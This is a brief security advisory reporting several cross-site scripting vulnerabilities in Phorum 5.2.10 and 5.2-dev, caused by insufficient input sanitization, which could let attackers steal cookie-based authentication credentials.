Phorum is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues to steal cookie-based authentication credentials and launch other attacks.

Phorum 5.2.10 and 5.2-dev are vulnerable; other versions may also be affected.
